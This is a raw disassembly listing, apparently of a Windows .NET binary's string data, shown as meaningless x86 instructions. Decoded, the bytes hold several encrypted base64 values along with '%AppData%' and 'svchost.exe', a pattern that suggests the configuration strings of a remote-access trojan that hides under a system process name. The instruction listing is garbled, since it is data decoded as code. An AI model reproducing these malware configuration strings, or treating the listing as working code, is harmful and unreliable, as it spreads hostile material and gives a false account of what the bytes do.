  4096be:	00 6d 00             	add    %ch,0x0(%ebp)
  4096c1:	6b 00 3d             	imul   $0x3d,(%eax),%eax
  4096c4:	00 00                	add    %al,(%eax)
  4096c6:	81 01 30 00 4f 00    	addl   $0x4f0030,(%ecx)
  4096cc:	35 00 73 00 44       	xor    $0x44007300,%eax
  4096d1:	00 56 00             	add    %dl,0x0(%esi)
  4096d4:	49                   	dec    %ecx
  4096d5:	00 33                	add    %dh,(%ebx)
  4096d7:	00 5a 00             	add    %bl,0x0(%edx)
  4096da:	42                   	inc    %edx
  4096db:	00 65 00             	add    %ah,0x0(%ebp)
  4096de:	61                   	popa
  4096df:	00 4b 00             	add    %cl,0x0(%ebx)
  4096e2:	76 00                	jbe    0x4096e4
  4096e4:	54                   	push   %esp
  4096e5:	00 36                	add    %dh,(%esi)
  4096e7:	00 46 00             	add    %al,0x0(%esi)
  4096ea:	79 00                	jns    0x4096ec
  4096ec:	63 00                	arpl   %eax,(%eax)
  4096ee:	52                   	push   %edx
  4096ef:	00 31                	add    %dh,(%ecx)
  4096f1:	00 57 00             	add    %dl,0x0(%edi)
  4096f4:	59                   	pop    %ecx
  4096f5:	00 73 00             	add    %dh,0x0(%ebx)
  4096f8:	44                   	inc    %esp
  4096f9:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  4096fd:	00 4f 00             	add    %cl,0x0(%edi)
  409700:	67 00 75 00          	add    %dh,0x0(%di)
  409704:	30 00                	xor    %al,(%eax)
  409706:	42                   	inc    %edx
  409707:	00 38                	add    %bh,(%eax)
  409709:	00 4f 00             	add    %cl,0x0(%edi)
  40970c:	63 00                	arpl   %eax,(%eax)
  40970e:	41                   	inc    %ecx
  40970f:	00 7a 00             	add    %bh,0x0(%edx)
  409712:	53                   	push   %ebx
  409713:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409717:	00 6d 00             	add    %ch,0x0(%ebp)
  40971a:	58                   	pop    %eax
  40971b:	00 73 00             	add    %dh,0x0(%ebx)
  40971e:	37                   	aaa
  40971f:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  409723:	00 5a 00             	add    %bl,0x0(%edx)
  409726:	64 00 39             	add    %bh,%fs:(%ecx)
  409729:	00 73 00             	add    %dh,0x0(%ebx)
  40972c:	54                   	push   %esp
  40972d:	00 33                	add    %dh,(%ebx)
  40972f:	00 4a 00             	add    %cl,0x0(%edx)
  409732:	59                   	pop    %ecx
  409733:	00 67 00             	add    %ah,0x0(%edi)
  409736:	6b 00 63             	imul   $0x63,(%eax),%eax
  409739:	00 49 00             	add    %cl,0x0(%ecx)
  40973c:	2f                   	das
  40973d:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  409741:	00 39                	add    %bh,(%ecx)
  409743:	00 52 00             	add    %dl,0x0(%edx)
  409746:	42                   	inc    %edx
  409747:	00 49 00             	add    %cl,0x0(%ecx)
  40974a:	53                   	push   %ebx
  40974b:	00 6f 00             	add    %ch,0x0(%edi)
  40974e:	72 00                	jb     0x409750
  409750:	68 00 55 00 35       	push   $0x35005500
  409755:	00 6d 00             	add    %ch,0x0(%ebp)
  409758:	52                   	push   %edx
  409759:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40975d:	00 67 00             	add    %ah,0x0(%edi)
  409760:	77 00                	ja     0x409762
  409762:	32 00                	xor    (%eax),%al
  409764:	49                   	dec    %ecx
  409765:	00 49 00             	add    %cl,0x0(%ecx)
  409768:	4f                   	dec    %edi
  409769:	00 46 00             	add    %al,0x0(%esi)
  40976c:	47                   	inc    %edi
  40976d:	00 31                	add    %dh,(%ecx)
  40976f:	00 48 00             	add    %cl,0x0(%eax)
  409772:	38 00                	cmp    %al,(%eax)
  409774:	67 00 35             	add    %dh,(%di)
  409777:	00 76 00             	add    %dh,0x0(%esi)
  40977a:	4b                   	dec    %ebx
  40977b:	00 75 00             	add    %dh,0x0(%ebp)
  40977e:	44                   	inc    %esp
  40977f:	00 66 00             	add    %ah,0x0(%esi)
  409782:	35 00 4d 00 4b       	xor    $0x4b004d00,%eax
  409787:	00 5a 00             	add    %bl,0x0(%edx)
  40978a:	42                   	inc    %edx
  40978b:	00 6e 00             	add    %ch,0x0(%esi)
  40978e:	74 00                	je     0x409790
  409790:	6e                   	outsb  %ds:(%esi),(%dx)
  409791:	00 72 00             	add    %dh,0x0(%edx)
  409794:	44                   	inc    %esp
  409795:	00 77 00             	add    %dh,0x0(%edi)
  409798:	79 00                	jns    0x40979a
  40979a:	75 00                	jne    0x40979c
  40979c:	6b 00 69             	imul   $0x69,(%eax),%eax
  40979f:	00 41 00             	add    %al,0x0(%ecx)
  4097a2:	4d                   	dec    %ebp
  4097a3:	00 41 00             	add    %al,0x0(%ecx)
  4097a6:	4d                   	dec    %ebp
  4097a7:	00 67 00             	add    %ah,0x0(%edi)
  4097aa:	51                   	push   %ecx
  4097ab:	00 73 00             	add    %dh,0x0(%ebx)
  4097ae:	71 00                	jno    0x4097b0
  4097b0:	4c                   	dec    %esp
  4097b1:	00 57 00             	add    %dl,0x0(%edi)
  4097b4:	6d                   	insl   (%dx),%es:(%edi)
  4097b5:	00 78 00             	add    %bh,0x0(%eax)
  4097b8:	69 00 58 00 35 00    	imul   $0x350058,(%eax),%eax
  4097be:	50                   	push   %eax
  4097bf:	00 78 00             	add    %bh,0x0(%eax)
  4097c2:	54                   	push   %esp
  4097c3:	00 7a 00             	add    %bh,0x0(%edx)
  4097c6:	4d                   	dec    %ebp
  4097c7:	00 00                	add    %al,(%eax)
  4097c9:	80 b1 6a 00 78 00 78 	xorb   $0x78,0x78006a(%ecx)
  4097d0:	00 71 00             	add    %dh,0x0(%ecx)
  4097d3:	50                   	push   %eax
  4097d4:	00 79 00             	add    %bh,0x0(%ecx)
  4097d7:	4c                   	dec    %esp
  4097d8:	00 63 00             	add    %ah,0x0(%ebx)
  4097db:	59                   	pop    %ecx
  4097dc:	00 5a 00             	add    %bl,0x0(%edx)
  4097df:	44                   	inc    %esp
  4097e0:	00 73 00             	add    %dh,0x0(%ebx)
  4097e3:	35 00 73 00 38       	xor    $0x38007300,%eax
  4097e8:	00 72 00             	add    %dh,0x0(%edx)
  4097eb:	45                   	inc    %ebp
  4097ec:	00 70 00             	add    %dh,0x0(%eax)
  4097ef:	64 00 30             	add    %dh,%fs:(%eax)
  4097f2:	00 4e 00             	add    %cl,0x0(%esi)
  4097f5:	45                   	inc    %ebp
  4097f6:	00 4a 00             	add    %cl,0x0(%edx)
  4097f9:	59                   	pop    %ecx
  4097fa:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4097fe:	00 71 00             	add    %dh,0x0(%ecx)
  409801:	4b                   	dec    %ebx
  409802:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  409806:	00 35 00 6a 00 75    	add    %dh,0x75006a00
  40980c:	00 49 00             	add    %cl,0x0(%ecx)
  40980f:	69 00 31 00 58 00    	imul   $0x580031,(%eax),%eax
  409815:	6e                   	outsb  %ds:(%esi),(%dx)
  409816:	00 76 00             	add    %dh,0x0(%esi)
  409819:	6b 00 65             	imul   $0x65,(%eax),%eax
  40981c:	00 46 00             	add    %al,0x0(%esi)
  40981f:	59                   	pop    %ecx
  409820:	00 41 00             	add    %al,0x0(%ecx)
  409823:	48                   	dec    %eax
  409824:	00 4a 00             	add    %cl,0x0(%edx)
  409827:	2b 00                	sub    (%eax),%eax
  409829:	43                   	inc    %ebx
  40982a:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40982e:	00 70 00             	add    %dh,0x0(%eax)
  409831:	48                   	dec    %eax
  409832:	00 4b 00             	add    %cl,0x0(%ebx)
  409835:	41                   	inc    %ecx
  409836:	00 6b 00             	add    %ch,0x0(%ebx)
  409839:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40983d:	2f                   	das
  40983e:	00 75 00             	add    %dh,0x0(%ebp)
  409841:	4a                   	dec    %edx
  409842:	00 53 00             	add    %dl,0x0(%ebx)
  409845:	4e                   	dec    %esi
  409846:	00 45 00             	add    %al,0x0(%ebp)
  409849:	6b 00 57             	imul   $0x57,(%eax),%eax
  40984c:	00 57 00             	add    %dl,0x0(%edi)
  40984f:	48                   	dec    %eax
  409850:	00 6a 00             	add    %ch,0x0(%edx)
  409853:	34 00                	xor    $0x0,%al
  409855:	6e                   	outsb  %ds:(%esi),(%dx)
  409856:	00 57 00             	add    %dl,0x0(%edi)
  409859:	68 00 32 00 4d       	push   $0x4d003200
  40985e:	00 4e 00             	add    %cl,0x0(%esi)
  409861:	45                   	inc    %ebp
  409862:	00 2f                	add    %ch,(%edi)
  409864:	00 53 00             	add    %dl,0x0(%ebx)
  409867:	2b 00                	sub    (%eax),%eax
  409869:	37                   	aaa
  40986a:	00 77 00             	add    %dh,0x0(%edi)
  40986d:	62 00                	bound  %eax,(%eax)
  40986f:	2b 00                	sub    (%eax),%eax
  409871:	7a 00                	jp     0x409873
  409873:	39 00                	cmp    %eax,(%eax)
  409875:	41                   	inc    %ecx
  409876:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40987c:	80 b1 36 00 30 00 74 	xorb   $0x74,0x300036(%ecx)
  409883:	00 73 00             	add    %dh,0x0(%ebx)
  409886:	75 00                	jne    0x409888
  409888:	72 00                	jb     0x40988a
  40988a:	56                   	push   %esi
  40988b:	00 58 00             	add    %bl,0x0(%eax)
  40988e:	73 00                	jae    0x409890
  409890:	55                   	push   %ebp
  409891:	00 4d 00             	add    %cl,0x0(%ebp)
  409894:	30 00                	xor    %al,(%eax)
  409896:	6f                   	outsl  %ds:(%esi),(%dx)
  409897:	00 69 00             	add    %ch,0x0(%ecx)
  40989a:	52                   	push   %edx
  40989b:	00 32                	add    %dh,(%edx)
  40989d:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  4098a1:	00 4d 00             	add    %cl,0x0(%ebp)
  4098a4:	4e                   	dec    %esi
  4098a5:	00 4f 00             	add    %cl,0x0(%edi)
  4098a8:	49                   	dec    %ecx
  4098a9:	00 49 00             	add    %cl,0x0(%ecx)
  4098ac:	78 00                	js     0x4098ae
  4098ae:	46                   	inc    %esi
  4098af:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  4098b3:	00 32                	add    %dh,(%edx)
  4098b5:	00 66 00             	add    %ah,0x0(%esi)
  4098b8:	51                   	push   %ecx
  4098b9:	00 75 00             	add    %dh,0x0(%ebp)
  4098bc:	58                   	pop    %eax
  4098bd:	00 46 00             	add    %al,0x0(%esi)
  4098c0:	4f                   	dec    %edi
  4098c1:	00 45 00             	add    %al,0x0(%ebp)
  4098c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4098c5:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  4098c9:	00 61 00             	add    %ah,0x0(%ecx)
  4098cc:	4e                   	dec    %esi
  4098cd:	00 2f                	add    %ch,(%edi)
  4098cf:	00 37                	add    %dh,(%edi)
  4098d1:	00 71 00             	add    %dh,0x0(%ecx)
  4098d4:	5a                   	pop    %edx
  4098d5:	00 78 00             	add    %bh,0x0(%eax)
  4098d8:	56                   	push   %esi
  4098d9:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  4098dd:	00 62 00             	add    %ah,0x0(%edx)
  4098e0:	46                   	inc    %esi
  4098e1:	00 55 00             	add    %dl,0x0(%ebp)
  4098e4:	35 00 56 00 79       	xor    $0x79005600,%eax
  4098e9:	00 4b 00             	add    %cl,0x0(%ebx)
  4098ec:	34 00                	xor    $0x0,%al
  4098ee:	2b 00                	sub    (%eax),%eax
  4098f0:	4a                   	dec    %edx
  4098f1:	00 79 00             	add    %bh,0x0(%ecx)
  4098f4:	6d                   	insl   (%dx),%es:(%edi)
  4098f5:	00 68 00             	add    %ch,0x0(%eax)
  4098f8:	73 00                	jae    0x4098fa
  4098fa:	62 00                	bound  %eax,(%eax)
  4098fc:	49                   	dec    %ecx
  4098fd:	00 79 00             	add    %bh,0x0(%ecx)
  409900:	4e                   	dec    %esi
  409901:	00 58 00             	add    %bl,0x0(%eax)
  409904:	71 00                	jno    0x409906
  409906:	57                   	push   %edi
  409907:	00 4e 00             	add    %cl,0x0(%esi)
  40990a:	50                   	push   %eax
  40990b:	00 39                	add    %bh,(%ecx)
  40990d:	00 52 00             	add    %dl,0x0(%edx)
  409910:	62 00                	bound  %eax,(%eax)
  409912:	53                   	push   %ebx
  409913:	00 2f                	add    %ch,(%edi)
  409915:	00 67 00             	add    %ah,0x0(%edi)
  409918:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40991b:	00 38                	add    %bh,(%eax)
  40991d:	00 46 00             	add    %al,0x0(%esi)
  409920:	45                   	inc    %ebp
  409921:	00 47 00             	add    %al,0x0(%edi)
  409924:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  409928:	41                   	inc    %ecx
  409929:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40992f:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409935:	00 70 00             	add    %dh,0x0(%eax)
  409938:	44                   	inc    %esp
  409939:	00 61 00             	add    %ah,0x0(%ecx)
  40993c:	74 00                	je     0x40993e
  40993e:	61                   	popa
  40993f:	00 25 00 00 17 73    	add    %ah,0x73170000
  409945:	00 76 00             	add    %dh,0x0(%esi)
  409948:	63 00                	arpl   %eax,(%eax)
  40994a:	68 00 6f 00 73       	push   $0x73006f00
  40994f:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  409953:	00 65 00             	add    %ah,0x0(%ebp)
  409956:	78 00                	js     0x409958
  409958:	65 00 00             	add    %al,%gs:(%eax)
  40995b:	59                   	pop    %ecx
  40995c:	52                   	push   %edx
  40995d:	00 6d 00             	add    %ch,0x0(%ebp)
  409960:	68 00 4a 00 57       	push   $0x57004a00
  409965:	00 45 00             	add    %al,0x0(%ebp)
  409968:	46                   	inc    %esi
  409969:	00 51 00             	add    %dl,0x0(%ecx)
  40996c:	53                   	push   %ebx
  40996d:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  409971:	00 31                	add    %dh,(%ecx)
  409973:	00 57 00             	add    %dl,0x0(%edi)
  409976:	6d                   	insl   (%dx),%es:(%edi)
  409977:	00 56 00             	add    %dl,0x0(%esi)
  40997a:	4e                   	dec    %esi
  40997b:	00 63 00             	add    %ah,0x0(%ebx)
  40997e:	48                   	dec    %eax
  40997f:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  409983:	00 4d 00             	add    %cl,0x0(%ebp)
  409986:	6d                   	insl   (%dx),%es:(%edi)
  409987:	00 78 00             	add    %bh,0x0(%eax)
  40998a:	70 00                	jo     0x40998c
  40998c:	62 00                	bound  %eax,(%eax)
  40998e:	55                   	push   %ebp
  40998f:	00 31                	add    %dh,(%ecx)
  409991:	00 7a 00             	add    %bh,0x0(%edx)
  409994:	4f                   	dec    %edi
  409995:	00 57 00             	add    %dl,0x0(%edi)
  409998:	35 00 75 00 54       	xor    $0x54007500,%eax
  40999d:	00 32                	add    %dh,(%edx)
  40999f:	00 56 00             	add    %dl,0x0(%esi)
  4099a2:	45                   	inc    %ebp
  4099a3:	00 61 00             	add    %ah,0x0(%ecx)
  4099a6:	54                   	push   %esp
  4099a7:	00 68 00             	add    %ch,0x0(%eax)
  4099aa:	57                   	push   %edi
  4099ab:	00 4e 00             	add    %cl,0x0(%esi)
  4099ae:	6d                   	insl   (%dx),%es:(%edi)
  4099af:	00 6b 00             	add    %ch,0x0(%ebx)
  4099b2:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4099b7:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  4099bb:	61                   	popa
  4099bc:	00 50 00             	add    %dl,0x0(%eax)
  4099bf:	47                   	inc    %edi
  4099c0:	00 56 00             	add    %dl,0x0(%esi)
  4099c3:	41                   	inc    %ecx
  4099c4:	00 66 00             	add    %ah,0x0(%esi)
  4099c7:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  4099cb:	43                   	inc    %ebx
  4099cc:	00 4d 00             	add    %cl,0x0(%ebp)
  4099cf:	4e                   	dec    %esi
  4099d0:	00 77 00             	add    %dh,0x0(%edi)
  4099d3:	53                   	push   %ebx
  4099d4:	00 77 00             	add    %dh,0x0(%edi)
  4099d7:	49                   	dec    %ecx
  4099d8:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  4099dc:	00 4f 00             	add    %cl,0x0(%edi)
  4099df:	63 00                	arpl   %eax,(%eax)
  4099e1:	68 00 78 00 6a       	push   $0x6a007800
  4099e6:	00 38                	add    %bh,(%eax)
  4099e8:	00 4b 00             	add    %cl,0x0(%ebx)
  4099eb:	54                   	push   %esp
  4099ec:	00 4b 00             	add    %cl,0x0(%ebx)
  4099ef:	54                   	push   %esp
  4099f0:	00 6d 00             	add    %ch,0x0(%ebp)
  4099f3:	37                   	aaa
  4099f4:	00 73 00             	add    %dh,0x0(%ebx)
  4099f7:	34 00                	xor    $0x0,%al
  4099f9:	32 00                	xor    (%eax),%al
  4099fb:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  4099ff:	42                   	inc    %edx
  409a00:	00 76 00             	add    %dh,0x0(%esi)
  409a03:	6b 00 67             	imul   $0x67,(%eax),%eax
  409a06:	00 5a 00             	add    %bl,0x0(%edx)
  409a09:	56                   	push   %esi
  409a0a:	00 71 00             	add    %dh,0x0(%ecx)
  409a0d:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  409a11:	47                   	inc    %edi
  409a12:	00 6a 00             	add    %ch,0x0(%edx)
  409a15:	68 00 36 00 62       	push   $0x62003600
  409a1a:	00 53 00             	add    %dl,0x0(%ebx)
  409a1d:	53                   	push   %ebx
  409a1e:	00 56 00             	add    %dl,0x0(%esi)
  409a21:	41                   	inc    %ecx
  409a22:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a25:	50                   	push   %eax
  409a26:	00 32                	add    %dh,(%edx)
  409a28:	00 63 00             	add    %ah,0x0(%ebx)
  409a2b:	61                   	popa
  409a2c:	00 4a 00             	add    %cl,0x0(%edx)
  409a2f:	52                   	push   %edx
  409a30:	00 48 00             	add    %cl,0x0(%eax)
  409a33:	35 00 6c 00 31       	xor    $0x31006c00,%eax
  409a38:	00 45 00             	add    %al,0x0(%ebp)
  409a3b:	75 00                	jne    0x409a3d
  409a3d:	39 00                	cmp    %eax,(%eax)
  409a3f:	58                   	pop    %eax
  409a40:	00 70 00             	add    %dh,0x0(%eax)
  409a43:	76 00                	jbe    0x409a45
  409a45:	38 00                	cmp    %al,(%eax)
  409a47:	63 00                	arpl   %eax,(%eax)
  409a49:	53                   	push   %ebx
  409a4a:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  409a4e:	00 30                	add    %dh,(%eax)
  409a50:	00 76 00             	add    %dh,0x0(%esi)
  409a53:	57                   	push   %edi
  409a54:	00 55 00             	add    %dl,0x0(%ebp)
  409a57:	49                   	dec    %ecx
  409a58:	00 51 00             	add    %dl,0x0(%ecx)
  409a5b:	56                   	push   %esi
  409a5c:	00 6e 00             	add    %ch,0x0(%esi)
  409a5f:	6a 00                	push   $0x0
  409a61:	77 00                	ja     0x409a63
  409a63:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409a68:	92                   	xchg   %eax,%edx
  409a69:	59                   	pop    %ecx
  409a6a:	4b                   	dec    %ebx
  409a6b:	00 50 00             	add    %dl,0x0(%eax)
  409a6e:	5a                   	pop    %edx
  409a6f:	00 33                	add    %dh,(%ebx)
  409a71:	00 6a 00             	add    %ch,0x0(%edx)
  409a74:	56                   	push   %esi
  409a75:	00 6d 00             	add    %ch,0x0(%ebp)
  409a78:	66 00 62 00          	data16 add %ah,0x0(%edx)
  409a7c:	4a                   	dec    %edx
  409a7d:	00 49 00             	add    %cl,0x0(%ecx)
  409a80:	68 00 59 00 77       	push   $0x77005900
  409a85:	00 38                	add    %bh,(%eax)
  409a87:	00 50 00             	add    %dl,0x0(%eax)
  409a8a:	76 00                	jbe    0x409a8c
  409a8c:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  409a90:	37                   	aaa
  409a91:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  409a95:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  409a99:	00 2b                	add    %ch,(%ebx)
  409a9b:	00 6f 00             	add    %ch,0x0(%edi)
  409a9e:	51                   	push   %ecx
  409a9f:	00 2f                	add    %ch,(%edi)
  409aa1:	00 72 00             	add    %dh,0x0(%edx)
  409aa4:	39 00                	cmp    %eax,(%eax)
  409aa6:	6b 00 79             	imul   $0x79,(%eax),%eax
  409aa9:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  409aad:	00 66 00             	add    %ah,0x0(%esi)
  409ab0:	68 00 77 00 52       	push   $0x52007700
  409ab5:	00 53 00             	add    %dl,0x0(%ebx)
  409ab8:	68 00 48 00 6f       	push   $0x6f004800
  409abd:	00 38                	add    %bh,(%eax)
  409abf:	00 38                	add    %bh,(%eax)
  409ac1:	00 65 00             	add    %ah,0x0(%ebp)
  409ac4:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  409ac8:	4c                   	dec    %esp
  409ac9:	00 37                	add    %dh,(%edi)
  409acb:	00 4f 00             	add    %cl,0x0(%edi)
  409ace:	77 00                	ja     0x409ad0
  409ad0:	61                   	popa
  409ad1:	00 5a 00             	add    %bl,0x0(%edx)
  409ad4:	41                   	inc    %ecx
  409ad5:	00 42 00             	add    %al,0x0(%edx)
  409ad8:	4b                   	dec    %ebx
  409ad9:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  409add:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  409ae1:	00 47 00             	add    %al,0x0(%edi)
  409ae4:	72 00                	jb     0x409ae6
  409ae6:	6b 00 61             	imul   $0x61,(%eax),%eax
  409ae9:	00 2f                	add    %ch,(%edi)
  409aeb:	00 4f 00             	add    %cl,0x0(%edi)
  409aee:	44                   	inc    %esp
  409aef:	00 53 00             	add    %dl,0x0(%ebx)
  409af2:	63 00                	arpl   %eax,(%eax)
  409af4:	6e                   	outsb  %ds:(%esi),(%dx)
  409af5:	00 34 00             	add    %dh,(%eax,%eax,1)
  409af8:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  409afc:	4a                   	dec    %edx
  409afd:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  409b01:	00 69 00             	add    %ch,0x0(%ecx)
  409b04:	4d                   	dec    %ebp
  409b05:	00 48 00             	add    %cl,0x0(%eax)
  409b08:	4f                   	dec    %edi
  409b09:	00 71 00             	add    %dh,0x0(%ecx)
  409b0c:	6d                   	insl   (%dx),%es:(%edi)
  409b0d:	00 4b 00             	add    %cl,0x0(%ebx)
  409b10:	63 00                	arpl   %eax,(%eax)
  409b12:	78 00                	js     0x409b14
  409b14:	33 00                	xor    (%eax),%eax
  409b16:	35 00 65 00 56       	xor    $0x56006500,%eax
  409b1b:	00 37                	add    %dh,(%edi)
  409b1d:	00 76 00             	add    %dh,0x0(%esi)
  409b20:	5a                   	pop    %edx
  409b21:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  409b25:	00 75 00             	add    %dh,0x0(%ebp)
  409b28:	74 00                	je     0x409b2a
  409b2a:	55                   	push   %ebp
  409b2b:	00 75 00             	add    %dh,0x0(%ebp)
  409b2e:	4c                   	dec    %esp
  409b2f:	00 70 00             	add    %dh,0x0(%eax)
  409b32:	4c                   	dec    %esp
  409b33:	00 2b                	add    %ch,(%ebx)
  409b35:	00 41 00             	add    %al,0x0(%ecx)
  409b38:	66 00 44 00 4e       	data16 add %al,0x4e(%eax,%eax,1)
  409b3d:	00 73 00             	add    %dh,0x0(%ebx)
  409b40:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409b44:	78 00                	js     0x409b46
  409b46:	55                   	push   %ebp
  409b47:	00 46 00             	add    %al,0x0(%esi)
  409b4a:	43                   	inc    %ebx
  409b4b:	00 6a 00             	add    %ch,0x0(%edx)
  409b4e:	4a                   	dec    %edx
  409b4f:	00 4d 00             	add    %cl,0x0(%ebp)
  409b52:	65 00 4c 00 47       	add    %cl,%gs:0x47(%eax,%eax,1)
  409b57:	00 47 00             	add    %al,0x0(%edi)
  409b5a:	37                   	aaa
  409b5b:	00 55 00             	add    %dl,0x0(%ebp)
  409b5e:	43                   	inc    %ebx
  409b5f:	00 47 00             	add    %al,0x0(%edi)
  409b62:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  409b66:	56                   	push   %esi
  409b67:	00 66 00             	add    %ah,0x0(%esi)
  409b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6b:	00 49 00             	add    %cl,0x0(%ecx)
  409b6e:	4d                   	dec    %ebp
  409b6f:	00 31                	add    %dh,(%ecx)
  409b71:	00 78 00             	add    %bh,0x0(%eax)
  409b74:	33 00                	xor    (%eax),%eax
  409b76:	6d                   	insl   (%dx),%es:(%edi)
  409b77:	00 33                	add    %dh,(%ebx)
  409b79:	00 58 00             	add    %bl,0x0(%eax)
  409b7c:	46                   	inc    %esi
  409b7d:	00 65 00             	add    %ah,0x0(%ebp)
  409b80:	46                   	inc    %esi
  409b81:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b84:	72 00                	jb     0x409b86
  409b86:	47                   	inc    %edi
  409b87:	00 71 00             	add    %dh,0x0(%ecx)
  409b8a:	33 00                	xor    (%eax),%eax
  409b8c:	30 00                	xor    %al,(%eax)
  409b8e:	79 00                	jns    0x409b90
  409b90:	31 00                	xor    %eax,(%eax)
  409b92:	41                   	inc    %ecx
  409b93:	00 47 00             	add    %al,0x0(%edi)
  409b96:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  409b9a:	53                   	push   %ebx
  409b9b:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b9e:	35 00 55 00 5a       	xor    $0x5a005500,%eax
  409ba3:	00 75 00             	add    %dh,0x0(%ebp)
  409ba6:	53                   	push   %ebx
  409ba7:	00 4b 00             	add    %cl,0x0(%ebx)
  409baa:	42                   	inc    %edx
  409bab:	00 45 00             	add    %al,0x0(%ebp)
  409bae:	54                   	push   %esp
  409baf:	00 67 00             	add    %ah,0x0(%edi)
  409bb2:	4e                   	dec    %esi
  409bb3:	00 2b                	add    %ch,(%ebx)
  409bb5:	00 4f 00             	add    %cl,0x0(%edi)
  409bb8:	59                   	pop    %ecx
  409bb9:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  409bbd:	00 42 00             	add    %al,0x0(%edx)
  409bc0:	42                   	inc    %edx
  409bc1:	00 52 00             	add    %dl,0x0(%edx)
  409bc4:	33 00                	xor    (%eax),%eax
  409bc6:	5a                   	pop    %edx
  409bc7:	00 57 00             	add    %dl,0x0(%edi)
  409bca:	32 00                	xor    (%eax),%al
  409bcc:	2b 00                	sub    (%eax),%eax
  409bce:	76 00                	jbe    0x409bd0
  409bd0:	63 00                	arpl   %eax,(%eax)
  409bd2:	67 00 33             	add    %dh,(%bp,%di)
  409bd5:	00 53 00             	add    %dl,0x0(%ebx)
  409bd8:	31 00                	xor    %eax,(%eax)
  409bda:	6c                   	insb   (%dx),%es:(%edi)
  409bdb:	00 72 00             	add    %dh,0x0(%edx)
  409bde:	4e                   	dec    %esi
  409bdf:	00 59 00             	add    %bl,0x0(%ecx)
  409be2:	55                   	push   %ebp
  409be3:	00 79 00             	add    %bh,0x0(%ecx)
  409be6:	72 00                	jb     0x409be8
  409be8:	51                   	push   %ecx
  409be9:	00 67 00             	add    %ah,0x0(%edi)
  409bec:	6a 00                	push   $0x0
  409bee:	34 00                	xor    $0x0,%al
  409bf0:	4a                   	dec    %edx
  409bf1:	00 46 00             	add    %al,0x0(%esi)
  409bf4:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  409bf8:	4b                   	dec    %ebx
  409bf9:	00 51 00             	add    %dl,0x0(%ecx)
  409bfc:	31 00                	xor    %eax,(%eax)
  409bfe:	70 00                	jo     0x409c00
  409c00:	74 00                	je     0x409c02
  409c02:	77 00                	ja     0x409c04
  409c04:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  409c08:	53                   	push   %ebx
  409c09:	00 67 00             	add    %ah,0x0(%edi)
  409c0c:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  409c10:	52                   	push   %edx
  409c11:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  409c15:	00 50 00             	add    %dl,0x0(%eax)
  409c18:	4c                   	dec    %esp
  409c19:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  409c1d:	00 33                	add    %dh,(%ebx)
  409c1f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c22:	46                   	inc    %esi
  409c23:	00 6f 00             	add    %ch,0x0(%edi)
  409c26:	32 00                	xor    (%eax),%al
  409c28:	62 00                	bound  %eax,(%eax)
  409c2a:	76 00                	jbe    0x409c2c
  409c2c:	70 00                	jo     0x409c2e
  409c2e:	42                   	inc    %edx
  409c2f:	00 33                	add    %dh,(%ebx)
  409c31:	00 72 00             	add    %dh,0x0(%edx)
  409c34:	39 00                	cmp    %eax,(%eax)
  409c36:	41                   	inc    %ecx
  409c37:	00 41 00             	add    %al,0x0(%ecx)
  409c3a:	31 00                	xor    %eax,(%eax)
  409c3c:	54                   	push   %esp
  409c3d:	00 2f                	add    %ch,(%edi)
  409c3f:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  409c43:	00 43 00             	add    %al,0x0(%ebx)
  409c46:	70 00                	jo     0x409c48
  409c48:	72 00                	jb     0x409c4a
  409c4a:	41                   	inc    %ecx
  409c4b:	00 31                	add    %dh,(%ecx)
